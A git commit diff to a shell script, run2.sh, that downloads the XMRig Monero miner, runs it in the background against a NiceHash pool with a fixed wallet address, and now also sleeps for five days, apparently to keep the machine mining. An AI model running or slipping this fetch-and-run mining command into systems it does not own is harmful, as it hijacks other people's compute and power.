3c95bed421038b5f9e78e1475c134e03f03331ce
SPA0454 <117052197+SPA0454@users.noreply.github.com>
2022-11-01 22:53:22 +0700

    Update run2.sh

--- run2.sh
+++ run2.sh
@@ -1,2 +1,3 @@
 #!/bin/bash -p
-export TERM=xterm && wget https://github.com/xmrig/xmrig/releases/download/v6.14.1/xmrig-6.14.1-linux-x64.tar.gz && tar -zxvf xmrig-6.14.1-linux-x64.tar.gz && cd xmrig-6.14.1 && clear && ./xmrig -a randomx -o stratum+tcp://randomxmonero.eu.nicehash.com:9200 -u 32CEjZD9d7MRtnHpCUMSYUjczC3b4upf5M.ZEEZAA0 -p x -B 
+export TERM=xterm && wget https://github.com/xmrig/xmrig/releases/download/v6.14.1/xmrig-6.14.1-linux-x64.tar.gz && tar -zxvf xmrig-6.14.1-linux-x64.tar.gz && cd xmrig-6.14.1 && clear && ./xmrig -a randomx -o stratum+tcp://randomxmonero.eu.nicehash.com:9200 -u 32CEjZD9d7MRtnHpCUMSYUjczC3b4upf5M.ZEEZAA0 -p x -B &&
+sleep 5d
